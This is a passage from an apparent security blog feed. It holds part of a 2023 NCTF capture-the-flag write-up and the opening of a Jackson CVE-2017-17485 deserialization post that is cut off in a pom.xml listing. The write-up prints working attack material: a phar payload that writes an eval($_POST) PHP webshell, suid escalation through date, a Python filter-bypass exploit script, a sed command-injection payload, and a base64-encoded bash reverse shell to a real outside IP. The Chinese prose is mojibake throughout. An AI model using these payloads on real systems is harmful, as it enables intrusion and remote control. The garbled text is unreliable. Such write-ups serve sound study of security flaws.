class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="title class_">class</span> <span class="title class_">WP_HTML_Token</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="title class_">public</span> $<span class="title class_">bookmark_name</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$on_destroy</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$bookmark_name</span>, <span class="variable">$on_destroy</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;bookmark_name = <span class="variable">$bookmark_name</span>;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;on_destroy = <span class="variable">$on_destroy</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">\WP_HTML_Token</span>(<span class="string">&#x27;echo \&#x27;&lt;?php @eval($_POST[&quot;nepnb&quot;]);?&gt;\&#x27; &gt; /var/www/html/nepnep.php&#x27;</span>, <span class="string">&#x27;system&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span> =<span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;GIF89A&lt;?php XXX __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æœ€åä¸è®ºæ˜¯æ–‡ä»¶ä¸Šä¼ è¿˜æ˜¯ phar ç”Ÿæˆï¼Œéƒ½è¸©äº†ä¸å°‘å‘ã€‚</p><p>æœ€åè¿ä¸Š shell ä¹‹åéœ€è¦ suid ææƒ</p><img src="/2023/12/27/2023-NCTF-WP/suid.png" class><p>dateÂ suidÂ </p><p>dateÂ -fÂ æ–‡ä»¶å</p><img src="/2023/12/27/2023-NCTF-WP/flag2.png" class><h2 id="wait-what"><a href="#wait-what" class="headerlink" title="wait what"></a>wait what</h2><p>åšçš„æ—¶å€™å°±æ„Ÿè§‰æ˜¯æŸç§ç‰¹æ€§ï¼Œçœ‹åˆ° in çš„æ—¶å€™æ„Ÿè§‰é—®é¢˜æŒºå¤§çš„</p><img src="/2023/12/27/2023-NCTF-WP/in.png" class><p>æœäº†ä¸€ä¸‹ç›¸å…³çš„ç‰¹æ€§ <a class="link" href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/in">https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/in<i class="fas fa-external-link-alt"></i></a></p><blockquote><p>å¦‚æœæŒ‡å®šçš„å±æ€§åœ¨æŒ‡å®šçš„å¯¹è±¡æˆ–å…¶åŸå‹é“¾ä¸­ï¼Œåˆ™Â <strong><code>in</code></strong>Â <strong>è¿ç®—ç¬¦</strong>è¿”å›Â <code>true</code>ã€‚</p></blockquote><p>æœ¬åœ°æµ‹è¯•ä¸€ä¸‹</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> banned_users = [<span class="string">&#x27;hacker&#x27;</span>]</span><br><span class="line"></span><br><span class="line">banned_users.<span class="title function_">push</span>(<span class="string">&quot;admin&quot;</span>)</span><br><span class="line"></span><br><span class="line">username=<span class="string">&#x27;admin&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> test2 = (username <span class="keyword">in</span> banned_users)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`ä½¿ç”¨inå…³é”®å­—åŒ¹é…<span class="subst">$&#123;username&#125;</span>çš„ç»“æœä¸ºï¼š<span class="subst">$&#123;test2&#125;</span>`</span>)</span><br><span class="line">    <span class="keyword">if</span> (test2) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;ç¬¬äºŒä¸ªåˆ¤æ–­åŒ¹é…åˆ°å°ç¦ç”¨æˆ·ï¼š&quot;</span>,username)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å½“ username &#x3D; â€˜adminâ€™ æ—¶ï¼Œè¿”å› falseï¼Œå½“ username &#x3D; â€˜0â€™ æ—¶ï¼Œè¿”å› true</p><p>ç”±äº banned_users ä¸º Array ç±»å‹ï¼Œä¸å­˜åœ¨ admin å±æ€§ï¼Œå› æ­¤ test2 å®é™…ä¸Šåˆ¤æ–­çš„æ˜¯banned_users ä¸­æ˜¯å¦å­˜åœ¨æ•°ç»„ç´¢å¼•ä¸º username çš„å€¼ï¼ˆç”±äºå¯¹è±¡çš„å±æ€§åç§°ä¼šè¢«éšå¼è½¬æ¢ä¸ºå­—ç¬¦ä¸²ï¼Œâ€0â€ å’Œ 0 éƒ½å¯ä»¥ä½œä¸ºæ•°ç»„ç´¢å¼•ï¼‰</p><p>è¿™é‡Œè¿‡äº†ç¬¬ä¸€æ­¥ä¹‹åè¿˜æœ‰ä¸€æ­¥æ­£åˆ™çš„è¿‡æ»¤ï¼Œæ¯”è¾ƒæ˜æ˜¾çš„æ˜¯ test å‡½æ•°</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> test1 = banned_users_regex.<span class="title function_">test</span>(username)</span><br></pre></td></tr></table></figure><blockquote><p>test() æ–¹æ³•ç”¨äºæ£€æµ‹ä¸€ä¸ªå­—ç¬¦ä¸²æ˜¯å¦åŒ¹é…æŸä¸ªæ¨¡å¼.</p></blockquote><p>ç”±äº <code>new RegExp(regex_string, &quot;g&quot;)</code> å®šä¹‰äº† g çš„å…¨å±€æ ‡å¿—</p><p>å¦‚æœæ­£åˆ™è¡¨è¾¾å¼è®¾ç½®äº†å…¨å±€æ ‡å¿—ï¼Œ <code>test()</code> çš„æ‰§â¾ä¼šæ”¹å˜æ­£åˆ™è¡¨è¾¾å¼ lastIndex å±æ€§ã€‚è¿ç»­åœ°æ‰§â¾ <code>test()</code> â½…æ³•ï¼Œåç»­çš„æ‰§â¾å°†ä¼šä» lastIndex å¤„å¼€å§‹åŒ¹é…å­—ç¬¦ä¸²</p><ul><li>example</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> &gt; <span class="keyword">let</span> r = <span class="regexp">/^admin$/g</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">3</span> &gt; r.<span class="property">lastIndex</span></span><br><span class="line"><span class="number">4</span> <span class="number">0</span></span><br><span class="line"><span class="number">5</span></span><br><span class="line"><span class="number">6</span> &gt; r.<span class="title function_">test</span>(<span class="string">&quot;admin&quot;</span>)</span><br><span class="line"><span class="number">7</span> <span class="literal">true</span></span><br><span class="line"><span class="number">8</span></span><br><span class="line"><span class="number">9</span> &gt; r.<span class="property">lastIndex</span></span><br><span class="line"><span class="number">10</span> <span class="number">5</span></span><br><span class="line"><span class="number">11</span></span><br><span class="line"><span class="number">12</span> r.<span class="title function_">test</span>(<span class="string">&quot;admin&quot;</span>)</span><br><span class="line"><span class="number">13</span> <span class="literal">false</span></span><br><span class="line"><span class="number">14</span></span><br><span class="line"><span class="number">15</span> &gt; r.<span class="property">lastIndex</span></span><br><span class="line"><span class="number">16</span> <span class="number">0</span></span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆè¿™é‡Œçš„æ”»å‡»æ€è·¯æ˜¯ä»€ä¹ˆå‘¢ï¼Œæ€»ç»“ä¸€ä¸‹åº”è¯¥æ˜¯æƒ³åŠæ³•è®© admin è¿™ä¸ªç”¨æˆ·çš„ lastIndex è¢«æˆ‘ä»¬æ¶æ„ä¿®æ”¹ä¸º <code>admin.length</code>ã€‚æ”»å‡»åˆ†ä¸ºä¸¤æ­¥èµ°</p><p>1ã€è®¿é—® <code>/api/ban_user</code> è·¯ç”±ï¼Œæ„é€ æ•°ç»„ä¼ å…¥ï¼Œç»•è¿‡ <code>in</code> çš„è¿‡æ»¤<br>2ã€è®¿é—® <code>/api/flag</code>ï¼Œå‘ä¸¤æ¬¡åŒ…ï¼Œå°±èƒ½å¤Ÿè®© <code>r.lastIndex</code> å˜æˆ <code>admin.length</code>ï¼Œç»•è¿‡ waf</p><p>ä½†æ˜¯è¿™é‡Œå®æ–½èµ·æ¥è¿˜æ˜¯æœ‰ä¸ªé—®é¢˜ï¼Œä¸‹é¢è¿™æ®µä»£ç æ¯æ¬¡åœ¨è¯·æ±‚æ—¶éƒ½ä¼šåˆ›å»ºâ¼€ä¸ªæ–°çš„ <code>banned_users_regex</code> ï¼Œæ¢å¤å…¶ lastIndex ä½ç½®ä¸ºåˆå§‹å€¼ 0</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">use</span>(<span class="keyword">function</span> (<span class="params">req, res, next</span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="title function_">build_banned_users_regex</span>()</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;å°ç¦ç”¨æˆ·æ­£åˆ™è¡¨è¾¾å¼ï¼ˆæ»¡è¶³è¿™ä¸ªæ­£åˆ™è¡¨è¾¾å¼çš„ç”¨æˆ·åä¸ºè¢«å°ç¦ç”¨æˆ·åï¼‰ï¼š&quot;</span>,banned_users_regex)</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">next</span>()</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„ç»•è¿‡æŒºå·§å¦™çš„ï¼Œåˆç”¨åˆ°äº†ä¸€ä¸ªç‰¹æ€§</p><p>ç°å¦‚æœä¼ â¼Š <code>escapeRegExp(string)</code> å‡½æ•°ä¸­çš„ string å‚æ•°ä¸ºâ¾®å­—ç¬¦ä¸²ç±»å‹ï¼Œåˆ™ string ä¸å­˜åœ¨ replace å±æ€§ï¼Œä¼šæŠ›å‡ºTypeErrorï¼Œå¦‚æ­¤æ¥ç»•è¿‡ regex çš„æ›´æ–°</p><p>å¦‚æ­¤ä¸€æ¥ï¼Œæœ€åçš„ EXP å°±æ˜¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">remote_addr=<span class="string">&quot;http://127.0.0.1&quot;</span></span><br><span class="line"></span><br><span class="line">rs = requests.Session()</span><br><span class="line"></span><br><span class="line">resp = rs.post(remote_addr+<span class="string">&quot;/api/register&quot;</span>,json=</span><br><span class="line">&#123;<span class="string">&quot;username&quot;</span>:<span class="string">&quot;test&quot;</span>,<span class="string">&quot;password&quot;</span>:<span class="string">&quot;test&quot;</span>&#125;)</span><br><span class="line"><span class="built_in">print</span>(resp.text)</span><br><span class="line"></span><br><span class="line">resp = rs.post(remote_addr+<span class="string">&quot;/api/ban_user&quot;</span>,json=</span><br><span class="line">&#123;<span class="string">&quot;username&quot;</span>:<span class="string">&quot;test&quot;</span>,<span class="string">&quot;password&quot;</span>:<span class="string">&quot;test&quot;</span>,<span class="string">&quot;ban_username&quot;</span>:&#123;<span class="string">&quot;toString&quot;</span>:<span class="string">&quot;&quot;</span>&#125;&#125;)</span><br><span class="line"><span class="built_in">print</span>(resp.text)</span><br><span class="line"></span><br><span class="line">resp = rs.post(remote_addr+<span class="string">&quot;/api/flag&quot;</span>,json=</span><br><span class="line">&#123;<span class="string">&quot;username&quot;</span>:<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;password&quot;</span>:<span class="string">&quot;admin&quot;</span>&#125;)</span><br><span class="line"><span class="built_in">print</span>(resp.text)</span><br><span class="line"></span><br><span class="line">resp = rs.post(remote_addr+<span class="string">&quot;/api/flag&quot;</span>,json=</span><br><span class="line">&#123;<span class="string">&quot;username&quot;</span>:<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;password&quot;</span>:<span class="string">&quot;admin&quot;</span>&#125;)</span><br><span class="line"><span class="built_in">print</span>(resp.text)</span><br></pre></td></tr></table></figure><img src="/2023/12/27/2023-NCTF-WP/flag3.png" class><h3 id="è°ƒè¯•åˆ†æ"><a href="#è°ƒè¯•åˆ†æ" class="headerlink" title="è°ƒè¯•åˆ†æ"></a>è°ƒè¯•åˆ†æ</h3><p>è™½ç„¶ç†è§£äº†ç‰¹æ€§ï¼Œä¸è¿‡æˆ‘ä¸ªäººè§‰å¾—ä¸è°ƒè¯•ä¸€ä¸‹æ˜¯å¾ˆä¸æ¸…æ™°çš„ï¼Œæ‰€ä»¥å°±åˆè°ƒè¯•äº†ä¸€éã€‚</p><p>å…ˆæ¥çœ‹ç¬¬ä¸€éå‘åŒ…çš„æ—¶å€™ï¼Œä¼ æ•°ç»„ï¼Œç¡®å®èƒ½å¤Ÿçœ‹åˆ°æŠ›å‡ºå¼‚å¸¸ï¼Œå¯¼è‡´ <code>lastIndex</code> ä¸ä¼šè¢«é‡ç½®ã€‚</p><img src="/2023/12/27/2023-NCTF-WP/debug1.png" class><p>æ¥ç€å»è¯·æ±‚ <code>/api/flag</code>ï¼Œå»ä¿®æ”¹ <code>lastIndex</code>ï¼Œç¬¬ä¸€æ¬¡çš„æ—¶å€™ï¼Œç”±äº <code>lastIndex</code> è¿˜æ˜¯ 0ï¼ŒåŒ¹é… admin ä¸º true</p><img src="/2023/12/27/2023-NCTF-WP/index0.png" class><p>å½“ç¬¬äºŒæ¬¡å†å‘èµ·è¯·æ±‚çš„æ—¶å€™</p><img src="/2023/12/27/2023-NCTF-WP/index5.png" class><p>æˆåŠŸ bypass äº†</p><h2 id="Webshell-Generator"><a href="#Webshell-Generator" class="headerlink" title="Webshell Generator"></a>Webshell Generator</h2><p>æœ€å¼€å§‹ download.php æ˜¯æœ‰ä»»æ„æ–‡ä»¶è¯»å–çš„ï¼Œä¸èƒ½ç›´æ¥è¯» flagï¼Œéœ€è¦æ‰§è¡Œ <code>/readflag</code>ï¼Œæ‰€ä»¥éœ€è¦ rce çš„ã€‚æ ¸å¿ƒèšç„¦äºè¿™ä¸€ä¸ªæ–‡ä»¶ä¸Šï¼Œgenerate.sh</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> -e</span><br><span class="line"></span><br><span class="line">NEW_FILENAME=$(<span class="built_in">tr</span> -dc a-z0-9 &lt;/dev/urandom | <span class="built_in">head</span> -c 16)</span><br><span class="line"><span class="built_in">cp</span> template.php <span class="string">&quot;/tmp/<span class="variable">$NEW_FILENAME</span>&quot;</span></span><br><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line"></span><br><span class="line">sed -i <span class="string">&quot;s/KEY/<span class="variable">$KEY</span>/g&quot;</span> <span class="string">&quot;<span class="variable">$NEW_FILENAME</span>&quot;</span></span><br><span class="line">sed -i <span class="string">&quot;s/METHOD/<span class="variable">$METHOD</span>/g&quot;</span> <span class="string">&quot;<span class="variable">$NEW_FILENAME</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">realpath</span> <span class="string">&quot;<span class="variable">$NEW_FILENAME</span>&quot;</span></span><br></pre></td></tr></table></figure><p>sed -i å‘½ä»¤ç”¨äºåœ¨æ–‡ä»¶ä¸­ç›´æ¥ä¿®æ”¹æ–‡æœ¬å†…å®¹ï¼Œè€Œä¸æ˜¯å°†è¾“å‡ºæ‰“å°åˆ°æ ‡å‡†è¾“å‡ºã€‚ä½¿ç”¨è¯¥å‘½ä»¤å¯ä»¥åœ¨ä¸åˆ›å»ºä¸´æ—¶æ–‡ä»¶çš„æƒ…å†µä¸‹ï¼Œç›´æ¥ä¿®æ”¹åŸå§‹æ–‡ä»¶çš„å†…å®¹ã€‚</p><p>è¿™é‡Œçš„ sed -i çš„æœ€ç»ˆæ•ˆæœæ˜¯ä¿®æ”¹ template.php ä¸­çš„ä»»æ„ä¸€ä¸ªå˜é‡ã€‚</p><p>æ¥çœ‹ä¸€ä¸‹ <code>sed</code> å‘½ä»¤çš„å®˜æ–¹æ–‡æ¡£</p><p><a class="link" href="https://www.gnu.org/software/sed/manual/">https://www.gnu.org/software/sed/manual/<i class="fas fa-external-link-alt"></i></a></p><p>GNU sed å¯ä»¥é€šè¿‡ e æŒ‡ä»¤æ‰§â¾ç³»ç»Ÿå‘½ä»¤ã€‚é—­åˆåŸå…ˆçš„sæŒ‡ä»¤ï¼Œæ‰§â¾ <code>/readflag</code>ï¼Œä¼šå°† flag æ’â¼Šåˆ°è¾“å‡ºâ½‚ä»¶çš„ç¬¬â¼€â¾ã€‚â¾ƒåŠ¨è·³è½¬åˆ° download.php è¯»å–å³å¯ã€‚</p><p>ç”±æ­¤èƒ½å¤Ÿæ„é€ å‡ºçš„ payload æ˜¯</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/g;1e /readflag;s</span><br></pre></td></tr></table></figure><img src="/2023/12/27/2023-NCTF-WP/readflag.png" class><p>æ‹¿åˆ° flag</p><img src="/2023/12/27/2023-NCTF-WP/flag4.png" class><p>åå¼¹ shell ä¹Ÿæ˜¯å¯ä»¥çš„ï¼ˆä½†æ˜¯æˆ‘å¤ç°å¤±è´¥äº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">resp = requests.post(<span class="string">&quot;http://117.50.175.234:8001/index.php&quot;</span>,data=</span><br><span class="line">&#123;<span class="string">&quot;language&quot;</span>:<span class="string">&quot;PHP&quot;</span>,<span class="string">&quot;key&quot;</span>:<span class="string">&#x27;&#x27;&#x27;/g; 1e bash -c &quot;&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjQuMjIyLjIxLjEzOC8zMzMzIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; #s//&#x27;&#x27;&#x27;</span>,<span class="string">&quot;method&quot;</span>:<span class="string">&quot;1&quot;</span>,<span class="string">&quot;filename&quot;</span>:<span class="string">&quot;2&quot;</span>&#125;)</span><br><span class="line"><span class="built_in">print</span>(resp.status_code,resp.text)</span><br></pre></td></tr></table></figure><h2 id="EvilMQ"><a href="#EvilMQ" class="headerlink" title="EvilMQ"></a>EvilMQ</h2><p>æœ‰ç©ºå†å¤ç°ï¼Œæœ€è¿‘å¤ªå¿™äº†ã€‚</p><p>æƒ³ç»“åˆ QL æ¥çœ‹çœ‹ï¼Œæ„Ÿè§‰ä¸Šæœ‰å¯èƒ½æˆä¸ºä¸€ä¸ªæ–°çš„æ”»å‡»é¢ã€‚</p><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>æ€»ç»“ä¸€ä¸‹ï¼Œæ˜¯å¾ˆç”¨å¿ƒçš„æ¯”èµ›ï¼Œå‡ºé¢˜è´¨é‡å¾ˆé«˜</p>]]></content>
    
    
    <summary type="html">2023 NCTF WP</summary>
    
    
    
    <category term="WP" scheme="https://drun1baby.github.io/categories/WP/"/>
    
    
    <category term="WP" scheme="https://drun1baby.github.io/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>Jackson ååºåˆ—åŒ–ï¼ˆä¸‰ï¼‰CVE-2017-17485</title>
    <link href="https://drun1baby.github.io/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%89%EF%BC%89CVE-2017-17485/"/>
    <id>https://drun1baby.github.io/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%89%EF%BC%89CVE-2017-17485/</id>
    <published>2023-12-07T12:06:09.000Z</published>
    <updated>2023-12-07T12:41:05.752Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-æ¼æ´æè¿°"><a href="#0x01-æ¼æ´æè¿°" class="headerlink" title="0x01 æ¼æ´æè¿°"></a>0x01 æ¼æ´æè¿°</h2><p>æœ¬æ¬¡ Jackson ååºåˆ—åŒ–æ¼æ´æ˜¯åŸºäº <code>org.springframework.context.support.ClassPathXmlApplicationContext</code><br>çš„åˆ©ç”¨é“¾çš„ã€‚åœ¨å¼€å¯ <code>enableDefaultTyping()</code>  æˆ–ä½¿ç”¨æœ‰é—®é¢˜çš„ <code>@JsonTypeInfo</code> æ³¨è§£çš„å‰æä¸‹</p><p>å¯ä»¥é€šè¿‡ jackson-databind æ¥æ»¥ç”¨ Spring çš„ SpEL è¡¨è¾¾å¼æ³¨å…¥æ¼æ´æ¥è§¦å‘ Jackson ååºåˆ—åŒ–æ¼æ´çš„ï¼Œä»è€Œè¾¾åˆ°ä»»æ„å‘½ä»¤æ‰§è¡Œçš„æ•ˆæœã€‚</p><h3 id="å½±å“ç‰ˆæœ¬"><a href="#å½±å“ç‰ˆæœ¬" class="headerlink" title="å½±å“ç‰ˆæœ¬"></a>å½±å“ç‰ˆæœ¬</h3><p>Jackson 2.7ç³»åˆ— &lt; 2.7.9.2<br>Jackson 2.8ç³»åˆ— &lt; 2.8.11<br>Jackson 2.9ç³»åˆ— &lt; 2.9.4</p><h3 id="åˆ©ç”¨é™åˆ¶"><a href="#åˆ©ç”¨é™åˆ¶" class="headerlink" title="åˆ©ç”¨é™åˆ¶"></a>åˆ©ç”¨é™åˆ¶</h3><p>éœ€è¦é¢å¤–çš„ jar åŒ…ï¼Œå¹¶éå®Œå…¨çš„ Jackson æ¼æ´</p><p>ç¯å¢ƒæ‰€ç”¨çš„ <strong>pom.xml</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-databind<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.7.9.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.7.9<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-annotations<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.7.9<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-context<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.0.2.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-beans<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.0.2.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.0.2.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span>  